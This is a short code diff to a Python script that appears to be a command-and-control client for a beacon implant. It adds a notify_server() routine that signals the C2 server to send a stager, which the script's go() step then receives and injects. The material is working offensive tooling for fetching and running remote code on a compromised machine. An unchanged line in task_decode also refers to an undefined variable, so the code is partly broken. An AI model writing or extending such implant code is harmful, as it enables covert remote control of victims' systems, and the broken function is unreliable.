@@ -94,6 +94,13 @@ def task_encode(task):
 def task_decode(task):
     return base64.b64decode(data)
 
+def notify_server():
+    print "Notifying server that we're ready for a stager"
+    # Construct the data frame
+    notification_data_frame = [CLIENT_ID, task_encode(C2_BLOCK_TIME)]
+    send_server_notification(notification_data_frame)
+    print "Notification that we're ready sent to server"
+
 def go():
     print "Waiting for stager..."
     p = recvData(CLIENT_ID)
@@ -141,6 +148,9 @@ def interact(handle_beacon):
 
 # Prepare the transport module
 prepTransport()
+
+# Notify the server that we're ready
+notify_server()
 
 #Get and inject the stager
 handle_beacon = go()
